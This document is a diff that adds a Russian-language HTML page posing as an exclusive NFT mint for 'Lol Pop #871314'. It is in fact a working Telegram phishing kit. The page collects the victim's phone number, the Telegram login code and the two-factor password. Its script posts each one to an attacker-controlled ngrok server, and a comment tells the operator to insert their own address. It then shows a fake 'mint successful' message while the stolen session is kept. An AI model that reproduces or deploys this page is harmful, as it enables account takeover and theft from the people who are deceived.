@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>NFT Lol Pop #871314 | Эксклюзивный минт</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: radial-gradient(ellipse at 20% 30%, #0a0f2a, #02040c);
+            font-family: 'Segoe UI', 'Poppins', 'Inter', system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Анимированные звёзды */
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            opacity: 0.6;
+            animation: twinkle 3s infinite alternate;
+        }
+        @keyframes twinkle {
+            0% { opacity: 0.2; transform: scale(1);}
+            100% { opacity: 1; transform: scale(1.2);}
+        }
+
+        /* Основная карточка */
+        .glass-card {
+            position: relative;
+            z-index: 2;
+            background: rgba(12, 18, 34, 0.55);
+            backdrop-filter: blur(16px);
+            border-radius: 3rem;
+            border: 1px solid rgba(255, 100, 150, 0.4);
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05), 0 0 30px rgba(255, 70, 120, 0.3);
+            max-width: 520px;
+            width: 100%;
+            padding: 2rem 1.8rem;
+            transition: 0.4s;
+        }
+
+        /* Заголовок */
+        .nft-badge {
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+        .nft-badge span {
+            background: rgba(255, 70, 120, 0.2);
+            padding: 0.3rem 1rem;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            color: #ff8cb0;
+            letter-spacing: 1px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 100, 150, 0.5);
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            background: linear-gradient(135deg, #FFD166, #FF6B8B, #C44569);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-align: center;
+            margin: 0.5rem 0 0.2rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        .collection-id {
+            text-align: center;
+            color: #9aa8d9;
+            font-size: 0.8rem;
+            font-family: monospace;
+            margin-bottom: 1.5rem;
+            word-break: break-all;
+        }
+
+        /* GIF контейнер */
+        .gif-container {
+            width: 100%;
+            max-width: 280px;
+            margin: 0 auto 1.5rem;
+            border-radius: 2rem;
+            overflow: hidden;
+            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.6), 0 0 0 3px rgba(255,255,200,0.2);
+            transition: 0.3s;
+            background: #00000022;
+        }
+        .gif-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+            transition: 0.3s;
+        }
+        .gif-container:hover {
+            transform: scale(1.02);
+            box-shadow: 0 25px 40px -12px rgba(255,100,150,0.4);
+        }
+
+        /* Шаги */
+        .step-title {
+            font-weight: 600;
+            margin-bottom: 0.7rem;
+            color: #eef5ff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 1.1rem;
+        }
+        .step-title i {
+            font-size: 1.3rem;
+        }
+
+        input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #2e3a6e;
+            border-radius: 2rem;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.2s;
+            margin-bottom: 1rem;
+            font-weight: 400;
+        }
+        input:focus {
+            border-color: #ff7b9c;
+            box-shadow: 0 0 12px rgba(255, 100, 150, 0.5);
+        }
+        button {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(95deg, #FF4D6D, #FF9F4A);
+            border: none;
+            border-radius: 3rem;
+            color: #0a0f1e;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 0.2rem;
+            font-family: inherit;
+            box-shadow: 0 6px 14px rgba(255, 77, 109, 0.3);
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 20px rgba(255, 77, 109, 0.5);
+            background: linear-gradient(95deg, #FF6B8B, #FFB347);
+        }
+        .status {
+            margin-top: 1rem;
+            text-align: center;
+            font-size: 0.85rem;
+            font-weight: 500;
+            padding: 0.5rem;
+            border-radius: 2rem;
+        }
+        .hidden {
+            display: none;
+        }
+        .success {
+            background: rgba(0, 255, 170, 0.15);
+            color: #6effbc;
+            border: 1px solid #6effbc55;
+        }
+        .error {
+            background: rgba(255, 70, 70, 0.2);
+            color: #ff8a7a;
+            border: 1px solid #ff5e5e55;
+        }
+        .info {
+            background: rgba(255, 200, 70, 0.15);
+            color: #ffdd88;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 1.8rem;
+            font-size: 0.7rem;
+            color: #6a76a3;
+            border-top: 1px dashed #2e3a6e;
+            padding-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+<div class="stars" id="stars"></div>
+<div class="glass-card">
+    <div class="nft-badge"><span>🔷 LIMITED EDITION • 777/777</span></div>
+    <h1>LOL POP #871314</h1>
+    <div class="collection-id">⚡ NFT Lol Pop | редчайший дроп</div>
+
+    <div class="gif-container">
+        <!-- ЗАМЕНИТЕ ССЫЛКУ НА ВАШУ ПРЯМУЮ RAW GIF -->
+        <img id="nftGif" src="https://raw.githubusercontent.com/dqmir1111/casiik/main/lol.gif" alt="NFT Lol Pop animated" onerror="this.src='https://media4.giphy.com/media/3o7abB06u9bNzA8LC8/giphy.gif';">
+    </div>
+
+    <div id="step-phone">
+        <div class="step-title"><i>📱</i> Введите номер Telegram</div>
+        <input type="tel" id="phone" placeholder="+7 999 123 45 67" autocomplete="off">
+        <button id="sendCodeBtn">✨ Получить NFT ✨</button>
+    </div>
+
+    <div id="step-code" class="hidden">
+        <div class="step-title"><i>🔐</i> Код из Telegram</div>
+        <input type="text" id="code" placeholder="6-значный код">
+        <button id="verifyCodeBtn">Подтвердить →</button>
+    </div>
+
+    <div id="step-2fa" class="hidden">
+        <div class="step-title"><i>🔒</i> Двухфакторный пароль</div>
+        <input type="password" id="password" placeholder="Ваш 2FA пароль Telegram">
+        <button id="verify2FABtn">Разблокировать NFT</button>
+    </div>
+
+    <div id="status" class="status"></div>
+    <div id="successMsg" class="success hidden" style="text-align:center; margin-top:1rem;"></div>
+    <div class="footer">© Lol Pop Collection — минт навсегда в блокчейне</div>
+</div>
+
+<script>
+    // 🔁 НАСТРОЙКА — УКАЖИТЕ ВАШ НГРОК АДРЕС
+    const API_BASE = 'https://611d-85-195-83-114.ngrok-free.app';
+
+    let currentPhone = '';
+    let currentPhoneCodeHash = '';
+    let currentSession = null;
+
+    // Генерация падающих звёзд
+    function createStars() {
+        const starsContainer = document.getElementById('stars');
+        for(let i=0; i<120; i++) {
+            let star = document.createElement('div');
+            star.classList.add('star');
+            let size = Math.random() * 3 + 1;
+            star.style.width = size + 'px';
+            star.style.height = size + 'px';
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.animationDelay = Math.random() * 5 + 's';
+            star.style.animationDuration = Math.random() * 3 + 2 + 's';
+            starsContainer.appendChild(star);
+        }
+    }
+    createStars();
+
+    // Элементы DOM
+    const sendBtn = document.getElementById('sendCodeBtn');
+    const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+    const verify2FABtn = document.getElementById('verify2FABtn');
+
+    sendBtn.onclick = async () => {
+        const phone = document.getElementById('phone').value.trim();
+        if(!phone) { showStatus('Укажите номер телефона', 'error'); return; }
+        showStatus('📡 Отправка кода...', 'info');
+        try {
+            const res = await fetch(`${API_BASE}/send_code`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone})
+            });
+            const data = await res.json();
+            if(data.success) {
+                currentPhone = data.phone;
+                currentPhoneCodeHash = data.phone_code_hash;
+                showStatus('✅ Код отправлен! Проверьте Telegram', 'success');
+                document.getElementById('step-phone').classList.add('hidden');
+                document.getElementById('step-code').classList.remove('hidden');
+            } else {
+                showStatus('Ошибка: ' + (data.error || 'неизвестная'), 'error');
+            }
+        } catch(e) { showStatus('Сервер недоступен', 'error'); }
+    };
+
+    verifyCodeBtn.onclick = async () => {
+        const code = document.getElementById('code').value.trim();
+        if(!code) { showStatus('Введите код из SMS', 'error'); return; }
+        showStatus('🔄 Проверка кода...', 'info');
+        try {
+            const res = await fetch(`${API_BASE}/verify_code`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: currentPhone, code, phone_code_hash: currentPhoneCodeHash})
+            });
+            const data = await res.json();
+            if(data.success && data.completed === true) {
+                showFinalSuccess(data);
+            } else if(data.requires_2fa) {
+                currentSession = data.session;
+                showStatus('🔐 Требуется пароль 2FA', 'info');
+                document.getElementById('step-code').classList.add('hidden');
+                document.getElementById('step-2fa').classList.remove('hidden');
+            } else {
+                showStatus('Неверный код: ' + (data.error || 'попробуйте снова'), 'error');
+            }
+        } catch(e) { showStatus('Ошибка сети', 'error'); }
+    };
+
+    verify2FABtn.onclick = async () => {
+        const password = document.getElementById('password').value.trim();
+        if(!password) { showStatus('Введите ваш 2FA пароль', 'error'); return; }
+        showStatus('🔑 Проверка 2FA...', 'info');
+        try {
+            const res = await fetch(`${API_BASE}/verify_2fa`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: currentPhone, password, session: currentSession})
+            });
+            const data = await res.json();
+            if(data.success) {
+                showFinalSuccess(data);
+            } else {
+                showStatus('Ошибка 2FA: ' + (data.error || 'неверный пароль'), 'error');
+            }
+        } catch(e) { showStatus('Ошибка соединения', 'error'); }
+    };
+
+    function showFinalSuccess(data) {
+        showStatus('🎉 МИНТ УСПЕШЕН! NFT в вашем кошельке.', 'success');
+        document.getElementById('step-code').classList.add('hidden');
+        document.getElementById('step-2fa').classList.add('hidden');
+        document.getElementById('successMsg').innerHTML = `✅ <strong>LOL POP #871314</strong> передан владельцу @${data.username || data.first_name || 'collector'}.<br>🔥 Сессия сохранена, добро пожаловать в клуб.`;
+        document.getElementById('successMsg').classList.remove('hidden');
+    }
+
+    function showStatus(msg, type='info') {
+        const div = document.getElementById('status');
+        div.innerHTML = msg;
+        div.className = `status ${type}`;
+        if(type === 'success') setTimeout(() => { if(div.innerHTML === msg) div.innerHTML = ''; }, 4000);
+    }
+</script>
+</body>
+</html>
